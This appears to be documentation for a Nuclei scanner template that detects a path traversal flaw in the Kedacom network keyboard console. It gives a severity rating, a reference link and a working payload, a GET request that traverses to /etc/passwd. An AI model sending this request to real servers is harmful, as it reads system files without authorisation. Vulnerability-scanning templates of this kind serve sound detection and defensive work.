# Nuclei Template: Kedacom Network Keyboard Console - Arbitrary File Read
**Template ID:** kedacom-network-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**Source:** Nuclei Template (`kedacom-network-lfi.yaml`)

## Vulnerability Information & PoC

## Description
There is an arbitrary file reading vulnerability in the KEDACOM network keyboard console. Attacking this vulnerability can read arbitrary information from the server

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/../../../../../../../../etc/passwd
```

## References
- https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E7%A7%91%E8%BE%BE%20%E7%BD%91%E7%BB%9C%E9%94%AE%E7%9B%98%E6%8E%A7%E5%88%B6%E5%8F%B0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
